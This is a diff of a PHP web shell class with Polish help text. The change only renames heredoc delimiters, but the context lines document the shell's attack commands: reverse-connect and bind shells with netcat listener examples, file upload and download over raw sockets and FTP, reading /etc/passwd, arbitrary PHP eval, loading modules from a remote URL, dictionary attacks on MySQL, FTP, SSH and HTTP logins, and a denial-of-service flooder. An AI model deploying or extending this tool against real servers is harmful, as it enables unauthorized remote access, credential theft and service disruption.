@@ -169,10 +169,10 @@ class Shell
 		 * i podpowiadaniem skladni z tym wlasnie kodem ;), nacisnij ALT + SHIFT + M
 		 * to taki FEATURE ;]
 		 */
-		$sPhpInfo = <<<CONTENT
+		$sPhpInfo = <<<DATA
 
 /phpinfo
-CONTENT;
+DATA;
 
 		$this -> sPhpInfo = substr( $sPhpInfo, -7 );
 
@@ -332,12 +332,12 @@ CONTENT;
 		 */
 		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 echo - Wyświetla tekst
 
 	Użycie:
 		echo tekst do wyświetlenia
-HELP;
+DATA;
 		}
 
 		return htmlspecialchars( $this -> sArgv );
@@ -356,12 +356,12 @@ HELP;
 		 */
 		if( $this -> iArgc !== 0 )
 		{
-			return <<<HELP
+			return <<<DATA
 ping - Odpowiedź "pong"
 
 	Użycie:
 		ping
-HELP;
+DATA;
 		}
 
 		return 'pong';
@@ -380,7 +380,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 ls - Wyświetlanie informacji o plikach i katalogach
 
 	Użycie:
@@ -396,7 +396,7 @@ ls - Wyświetlanie informacji o plikach i katalogach
 		ls /home/
 		ls -l /home/
 		ls -lR /home/
-HELP;
+DATA;
 		}
 
 		$sOutput = NULL;
@@ -486,7 +486,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 cat - Wyświetlanie zawartości pliku
 
 	Użycie:
@@ -494,7 +494,7 @@ cat - Wyświetlanie zawartości pliku
 
 	Przykład:
 		cat /etc/passwd
-HELP;
+DATA;
 		}
 
 		/**
@@ -521,12 +521,12 @@ HELP;
 		 */
 		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 mkdir - Tworzenie katalogu
 
 	Użycie:
 		echo katalog [katalog2] [katalog3]
-HELP;
+DATA;
 		}
 
 		$sOutput = NULL;
@@ -559,12 +559,12 @@ HELP;
 		 */
 		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 cp, copy - Kopiowanie pliku
 
 	Użycie:
 		cp plik_lub_katalog_źródłowy plik_lub_katalog_docelowy
-HELP;
+DATA;
 		}
 
 		$sOutput = NULL;
@@ -590,12 +590,12 @@ HELP;
 		 */
 		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 mv, move - Przenoszenie pliku
 
 	Użycie:
 		mv plik_lub_katalog_źródłowy plik_lub_katalog_docelowy
-HELP;
+DATA;
 		}
 
 		$sOutput = NULL;
@@ -621,12 +621,12 @@ HELP;
 		 */
 		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 remove, rm, delete, del - Usuwanie pliku / katalogu. Zawartość katalogu zostanie usunięta rekurencyjnie
 
 	Użycie:
 		remove ścieżka_do_katalogu_lub_pliku
-HELP;
+DATA;
 		}
 
 		$sOutput = NULL;
@@ -718,7 +718,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc === 2 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 chmod - Zmiana uprawnień dla pliku
 
 	Użycie:
@@ -726,7 +726,7 @@ chmod - Zmiana uprawnień dla pliku
 
 	Przykład:
 		chmod 777 /tmp/plik
-HELP;
+DATA;
 		}
 
 		/**
@@ -766,7 +766,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 bcat, b64 - Wyświetlanie zawartości pliku przy użyciu base64
 
 	Użycie:
@@ -774,7 +774,7 @@ bcat, b64 - Wyświetlanie zawartości pliku przy użyciu base64
 
 	Przykład:
 		bcat /etc/passwd
-HELP;
+DATA;
 		}
 
 		/**
@@ -808,7 +808,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 eval, php - Wykonanie kodu PHP
 
 	Użycie:
@@ -816,7 +816,7 @@ eval, php - Wykonanie kodu PHP
 
 	Przykład:
 		eval echo md5( 'test' );
-HELP;
+DATA;
 		}
 
 		ob_start();
@@ -841,7 +841,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 modules - Wczytywanie dodakowych modułów shella
 
 	Użycie:
@@ -850,7 +850,7 @@ modules - Wczytywanie dodakowych modułów shella
 	Przykład:
 		modules /tmp/modules
 		modules http://example.com/modules.txt
-HELP;
+DATA;
 		}
 
 		/**
@@ -936,12 +936,12 @@ HELP;
 		 */
 		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 phpinfo - Informacje o PHP
 
 	Użycie:
 		{$this -> sPhpInfo}
-HELP;
+DATA;
 		}
 
 		ob_start();
@@ -989,7 +989,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 socketdownload, socketdown, socketget - Pobieranie pliku za pomocą protokołu TCP
 
 	Użycie:
@@ -1000,7 +1000,7 @@ socketdownload, socketdown, socketget - Pobieranie pliku za pomocą protokołu T
 
 	NetCat:
 		nc -vv -w 1 -l -p 6666 < plik.txt
-HELP;
+DATA;
 		}
 
 		/**
@@ -1053,7 +1053,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 ftpdownload, ftpdown, ftpdown - Pobieranie pliku z FTP
 
 	Użycie:
@@ -1061,7 +1061,7 @@ ftpdownload, ftpdown, ftpdown - Pobieranie pliku z FTP
 
 	Przykład:
 		ftpdownload localhost:6666 test@test /plik.txt /home/usr/plik.txt
-HELP;
+DATA;
 		}
 
 		$aHost = $this -> getHost( $this -> aArgv[0] );
@@ -1126,7 +1126,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 download, down, get - Pobieranie pliku
 
 	Użycie:
@@ -1138,7 +1138,7 @@ download, down, get - Pobieranie pliku
 	Przykład:
 		download /etc/passwd
 		download -g /etc/passwd
-HELP;
+DATA;
 		}
 
 		$bGzip = in_array( 'g', in_array( 'R', $this -> aOptv ) );
@@ -1200,7 +1200,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 socketupload, socketup, socketput - Wysyłanie pliku za pomocą protokołu TCP
 
 	Użycie:
@@ -1211,7 +1211,7 @@ socketupload, socketup, socketput - Wysyłanie pliku za pomocą protokołu TCP
 
 	NetCat:
 		nc -vv -l -p 6666
-HELP;
+DATA;
 		}
 
 		$aHost = $this -> getHost( $this -> aArgv[0] );
@@ -1272,7 +1272,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 ftpupload, ftpup, ftpput - Wysyłanie pliku na FTP
 
 	Użycie:
@@ -1280,7 +1280,7 @@ ftpupload, ftpup, ftpput - Wysyłanie pliku na FTP
 
 	Przykład:
 		ftpupload localhost:6666 test@test /home/usr/plik.txt /
-HELP;
+DATA;
 		}
 
 		/**
@@ -1353,7 +1353,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 mysql - Połączenie z bazą MySQL
 
 	Użycie:
@@ -1361,7 +1361,7 @@ mysql - Połączenie z bazą MySQL
 
 	Przykład:
 		mysql localhost:3306 test@test mysql "SELECT 1"
-HELP;
+DATA;
 		}
 
 		$aHost = $this -> getHost( $this -> aArgv[0] );
@@ -1487,7 +1487,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc < 3 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 mysqldump, mysqldumper, mysqlbackup, dumpdb - Kopia bazy danych MySQL
 
 	Użycie:
@@ -1495,7 +1495,7 @@ mysqldump, mysqldumper, mysqlbackup, dumpdb - Kopia bazy danych MySQL
 
 	Przykład:
 		mysqldump localhost:3306 test@test mysql users
-HELP;
+DATA;
 		}
 
 		$aHost = $this -> getHost( $this -> aArgv[0] );
@@ -1567,7 +1567,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 backconnect, bc - Połączenie zwrotne
 
 	Klient (shell) łączy się pod wskazany adres dając dostęp do powłoki
@@ -1584,7 +1584,7 @@ backconnect, bc - Połączenie zwrotne
 
 	NetCat:
 		nc -vv -l -p 6666
-HELP;
+DATA;
 		}
 
 		$aHost = $this -> getHost( $this -> aArgv[0] );
@@ -1643,7 +1643,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 bind - Dostęp do powłoki na danym porcie
 
 	Użycie:
@@ -1658,7 +1658,7 @@ bind - Dostęp do powłoki na danym porcie
 
 	NetCat:
 		nc host 6666
-HELP;
+DATA;
 		}
 
 		/**
@@ -1761,7 +1761,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 etcpasswd - Próba pobrania struktury pliku /etc/passwd za pomocą funkcji posix_getpwuid
 
 	Użycie:
@@ -1773,7 +1773,7 @@ etcpasswd - Próba pobrania struktury pliku /etc/passwd za pomocą funkcji posix
 
 		etcpasswd
 		etcpasswd 1000 2000
-HELP;
+DATA;
 		}
 
 		/**
@@ -1851,7 +1851,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 passwordrecovery, pr - Odzyskiwanie haseł, atak słownikowy na mysql, ftp, ssh2 oraz http
 
 	Typ:
@@ -1867,7 +1867,7 @@ passwordrecovery, pr - Odzyskiwanie haseł, atak słownikowy na mysql, ftp, ssh2
 	Przykład:
 		passwordrecovery http http://localhost/auth/ tester /tmp/dic
 		passwordrecovery mysql localhost:3306 tester /tmp/dic
-HELP;
+DATA;
 		}
 
 		try
@@ -1914,7 +1914,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 proxy - Proxy HTTP
 
 	Proxy nie ma wielowątkowości, i ma poblemy z flushowaniem !!!
@@ -1940,7 +1940,7 @@ proxy - Proxy HTTP
 	Przykład:
 		proxy 2222
 		proxy -i 2222
-HELP;
+DATA;
 		}
 
 		try
@@ -1984,7 +1984,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc !== 3 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 dos - Denial Of Service - wysyłanie losowych danych na protokoły tcp, udp i http
 
 	Typ:
@@ -2005,7 +2005,7 @@ dos - Denial Of Service - wysyłanie losowych danych na protokoły tcp, udp i ht
 	Przykład:
 		dos http http://localhost/auth/ 60
 		dos tcp localhost:80 60
-HELP;
+DATA;
 		}
 
 		try
@@ -2039,7 +2039,7 @@ HELP;
 	 */
 	private function getCommandCr3d1ts()
 	{
-		return <<<HELP
+		return <<<DATA
 Jak to się mówi: <strong>&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;</strong>
 
 Domyślnie tego polecenia nie ma, ale udało Ci się je znaleźć.
@@ -2090,7 +2090,7 @@ Changelog:
 	<strong>etcpasswd</strong>
 	<strong>game</strong>
 	<strong>help</strong>
-HELP;
+DATA;
 	}
 
 	/**
@@ -2107,7 +2107,7 @@ HELP;
 		 */
 		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
-			return <<<HELP
+			return <<<DATA
 g4m3 - Gra z komputerem, wspaniała na samotne wieczory ;)
 
 	Sprawdziłeś już komende <strong>:cr3d1ts</strong> ?
@@ -2116,7 +2116,7 @@ g4m3 - Gra z komputerem, wspaniała na samotne wieczory ;)
 		g4m3 cyfra_z_przedziału_0-9
 
 		g4m3 cyfra_z_przedziału_0-9 [ilość_losowań]
-HELP;
+DATA;
 		}
 
 		/**
@@ -2514,7 +2514,7 @@ HELP;
 		$sGeneratedIn = sprintf( '%.5f', microtime( 1 ) - $this -> fGeneratedIn );
 		$sTitle = sprintf( 'Shell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
 		$sVersion = self::VERSION;
-return <<<CONTENT
+return <<<DATA
 <!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset="utf-8"><style>
 body{background-color:#eef7fb;color:#000;font-size:12px;font-family:sans-serif, Verdana, Tahoma, Arial;margin:10px;padding:0;}
 a{color:#226c90;text-decoration:none;}
@@ -2548,7 +2548,7 @@ input#cmd-send{margin-top:10px;margin-left:20px;}
 	<div id="bottom">Strona wygenerowana w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>
 </div>
 </html>
-CONTENT;
+DATA;
 	}
 
 	/**
